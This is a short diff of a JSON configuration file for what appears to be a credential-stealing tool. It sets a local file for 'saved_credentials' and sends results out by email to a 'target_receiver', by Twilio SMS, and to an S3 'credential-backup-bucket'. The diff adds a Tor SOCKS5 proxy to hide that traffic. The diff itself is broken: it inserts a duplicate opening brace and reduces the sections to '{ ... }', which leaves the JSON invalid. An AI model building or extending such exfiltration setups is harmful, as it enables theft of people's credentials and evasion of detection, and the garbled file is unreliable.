@@ -1,20 +1,12 @@
 {
+{
   "local_output_path": "outputs/saved_credentials.txt",
-  "smtp": {
-    "server": "smtp.gmail.com",
-    "port": 587,
-    "sender_email": "your_email@gmail.com",
-    "sender_password": "your_app_password",
-    "recipient_email": "target_receiver@gmail.com"
+  "proxy": {
+    "enabled": true,
+    "http": "socks5://127.0.0.1:9050",
+    "https": "socks5://127.0.0.1:9050"
   },
-  "twilio": {
-    "account_sid": "your_twilio_sid",
-    "auth_token": "your_twilio_auth_token",
-    "from_number": "+15555550123",
-    "to_number": "+15555550199"
-  },
-  "aws_s3": {
-    "bucket_name": "your-credential-backup-bucket",
-    "region": "us-east-1"
-  }
+  "smtp": { ... },
+  "twilio": { ... },
+  "aws_s3": { ... }
 }
